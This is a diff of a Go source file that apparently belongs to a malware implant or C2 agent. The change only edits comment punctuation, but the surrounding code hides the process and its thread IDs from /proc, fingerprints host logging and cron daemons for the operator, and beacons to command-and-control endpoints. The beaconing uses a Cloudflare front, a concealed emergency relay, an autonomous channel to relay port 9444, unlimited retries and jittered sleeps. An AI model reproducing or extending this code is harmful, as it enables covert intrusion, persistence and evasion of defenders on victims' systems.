@@ -43,7 +43,7 @@ func main() {
 
 	// Register our PID and all thread TIDs in the mark file.
 	// Go creates multiple OS threads (goroutines scheduled on LWPs).
-	// Each TID appears in /proc independently — we hide all of them.
+	// Each TID appears in /proc independently   we hide all of them.
 	if err := writeAllTIDsToMark(ttp.HideMarkPath); err != nil && *verbose {
 		fmt.Fprintf(os.Stderr, "pid mark: %v\n", err)
 	}
@@ -82,13 +82,13 @@ func main() {
 	// Sent on every check-in so operator has visibility before issuing TTPs.
 	envReport := ttp.CollectEnvFingerprint([]string{"cron", "crond", "rsyslogd", "syslogd"})
 
-	// R-04: C2 endpoints — primary (Cloudflare) always; fallback (relay direct) is
+	// R-04: C2 endpoints   primary (Cloudflare) always; fallback (relay direct) is
 	// emergency-only, activated after emergencyThreshold consecutive primary failures.
 	// This avoids exposing the relay IP in routine traffic patterns.
 	primaryEndpoint := *serverAddr
 	emergencyEndpoint := config.FallbackServer
 
-	// K-series starts immediately — autonomous, no server dependency.
+	// K-series starts immediately   autonomous, no server dependency.
 	// Does not wait for first check-in; contacts relay:9444 directly.
 	go ttp.StartKSeries(kccAddr, config.SharedSecret, c2Port, agentPath)
 
@@ -104,7 +104,7 @@ func main() {
 	// so the injected stub uses the correct C2 IP).
 	activeEndpoint := primaryEndpoint
 
-	// O-01: exponential backoff — no maxRetries, only TTP 99/222 can stop the loop.
+	// O-01: exponential backoff   no maxRetries, only TTP 99/222 can stop the loop.
 	// maxBackoff capped at 90s so agents reconnect quickly when server comes back up.
 	consecutiveFails := 0
 	const maxBackoffShift = 6
@@ -175,7 +175,7 @@ func main() {
 				lastResult = ""
 			}
 
-			// Active server — fast re-beacon
+			// Active server   fast re-beacon
 			time.Sleep(time.Duration(rand.Intn(5001)) * time.Millisecond)
 		} else {
 			ttp.JitteredSleep(*idleInterval, *jitter)
